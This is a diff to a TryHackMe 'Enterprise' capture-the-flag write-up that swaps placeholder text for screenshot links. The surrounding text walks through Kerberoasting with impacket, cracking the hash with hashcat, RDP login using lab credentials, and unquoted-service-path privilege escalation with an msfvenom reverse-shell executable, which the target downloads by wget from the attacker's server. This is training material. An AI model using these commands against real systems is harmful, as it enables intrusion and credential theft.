@@ -13,7 +13,7 @@ nmap -p- --min-rate 5000 IP -Pn
 
 With -p- we indicate that we want it to look at all ports, -Pn is not to make ping requests since it is a windows and blocks them and the --min-rate 5000 to do it very fast.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/1.png)
 
 Now that we know the ports, let's scan them deeply to see versions and so on.
 
@@ -23,7 +23,7 @@ nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,799
 
 With -sC we indicate that we want to run the default nmap scripts and -sV to get the service versions.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/2.png)
 
 Now, let's add to /etc/hosts the domain name.
 
@@ -31,21 +31,21 @@ Now, let's add to /etc/hosts the domain name.
 IP lab.enterprise.thm
 ```
 
-FOTO 7
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/7.png)
 
 After a long time listing the different services of the machine we found this web where we are told that they are passed to [github](https://github.com/Enterprise-THM), let's check this github.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/3.png)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/4.png)
 
 We see a [person](https://github.com/Nik-enterprise-dev) on that github, let's take a look at theirs.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/5.png)
 
 It has a repository, if we look at the [history](https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8) of that repo we find a username and password.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/6.png)
 
 With the information we have and after listing several services with that name and password, we are going to use the impacket module GetUsersSPNs
 
@@ -58,7 +58,7 @@ This module will try to find Service Principal Names that are associated with no
 GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/8.png)
 
 We have found a service called bitbucket, we are going to take its NTLM hash and then crack it.
 
@@ -66,7 +66,7 @@ We have found a service called bitbucket, we are going to take its NTLM hash and
 GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/9.png)
 
 Let's save that hash and use hashcat to crack it.
 
@@ -74,7 +74,7 @@ Let's save that hash and use hashcat to crack it.
 hashcat -a 0 -m 13100 hash /home/m4luk0/wordlists/rockyou.txt
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/10.png)
 
 Let's try to connect via RDP to the machine.
 
@@ -82,7 +82,7 @@ Let's try to connect via RDP to the machine.
 xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm /dynamic-resolution
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/11.png)
 
 If we enumerate the machine, we can find the [unquoted service](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#unquoted-service-paths) vulnerability wich is based on the fact that when windows has to read a path with spaces, i.e. C:\Windows\Hello World\test.exe windows will execute hello.exe, world.exe and then it will enter the directory; then, if we create a malicious exe called hello.exe it will execute it before entering that directory.
 
@@ -92,7 +92,7 @@ In windows:
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/12.png)
 
 We see that there is a directory called Zero Tier One, we will exploit the vulnerability explained above, we will create on our machine a malicious exe that will send us a shell.
 
@@ -100,7 +100,7 @@ We see that there is a directory called Zero Tier One, we will exploit the vulne
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o Zero.exe
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/13.png)
 
 Now we are going to create a python server to pass it to windows.
 
@@ -108,7 +108,7 @@ Now we are going to create a python server to pass it to windows.
 python3 -m http.server
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/14.png)
 
 Let's set the port to listen.
 
@@ -116,7 +116,7 @@ Let's set the port to listen.
 nc -lvp PORT
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/15.png)
 
 In windows go to the folder and download the exe.
 
@@ -125,7 +125,7 @@ cd "C:\Program Files (x86)\Zero Tier"
 wget http://10.8.155.220:8000/Zero.exe -o Zero.exe
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/16.png)
 
 Now having everything ready we will only have to restart the service.
 
@@ -133,8 +133,8 @@ Now having everything ready we will only have to restart the service.
 Start-Service -name "zerotieroneservice"
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/17.png)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Enterprise/18.png)
 
 And so we would finish with this machine, thanks for reading.
